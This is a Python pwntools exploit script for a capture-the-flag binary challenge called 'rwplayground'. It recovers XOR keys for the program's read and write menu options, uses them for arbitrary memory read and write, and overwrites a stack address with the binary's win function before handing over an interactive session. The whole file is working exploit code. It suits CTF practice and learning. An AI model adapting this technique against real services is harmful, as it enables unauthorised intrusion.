#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template rwplayground '--host=rwplayground.challs.olicyber.it' '--port=38051'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'rwplayground')
context.terminal = ["alacritty", "-e", "zsh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'rwplayground.challs.olicyber.it'
port = int(args.PORT or 38051)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

read_key = 0
write_key = 0

def get_read_key():
    input = 0x2064696c61766e49 # "Invalid " in little endian
    io.sendlineafter(b"> ", b"1")
    io.recvline()
    io.sendline(b"0x004020ec")
    val = int(io.recvline().decode().split(":")[-1], 16)
    key = val ^ input 
    return key

def arb_read(addr):
    global read_key
    io.sendlineafter(b"> ", b"1")
    io.recvline()
    io.sendline(hex(addr).encode())
    val = int(io.recvline().decode().split(":")[-1], 16)
    return val ^ read_key

def get_write_key():
    io.sendlineafter(b"> ", b"2")
    io.recvline()
    io.sendline(b"0x404300")
    io.recvline()
    io.sendline(b"0x4141414141414141")
    val = arb_read(0x404300)
    key = val ^ 0x4141414141414141
    return key

def arb_write(addr, val):
    global write_key
    io.sendlineafter(b"> ", b"2")
    io.recvline()
    io.sendline(hex(addr).encode())
    io.recvline()
    io.sendline(hex(val ^ write_key).encode())

io = start()

io.recvline()
stack_leak = int(io.recvline().decode().split(" ")[-1], 16)

log.info(f"Stack leak: {hex(stack_leak)}")
read_key = get_read_key()

write_key = get_write_key()

arb_write(stack_leak + 0x14, exe.sym.win)

io.interactive()
